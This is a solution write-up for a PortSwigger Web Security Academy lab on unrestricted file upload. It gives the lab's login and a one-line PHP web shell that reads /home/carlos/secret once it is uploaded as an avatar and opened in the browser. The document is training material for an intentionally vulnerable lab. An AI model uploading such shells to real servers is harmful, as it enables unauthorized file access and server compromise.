# Lab Writeup: Remote code execution via web shell upload

URL: https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/file-upload-apprentice/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload#

## Description

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

1. Login using `wiener:peter`
2. Create the following php script:
   ```php
    <?php echo file_get_contents('/home/carlos/secret'); ?>
   ```
3. Upload to the avatar form
4. Right click on the image and "open in new tab"
   ![RCE Shell](/assets/rce-shell.png)
5. Copy the value, paste in the submit form and the lab should be solved.
   ![RCE Shell 1](/assets/rce-shell-1.png)
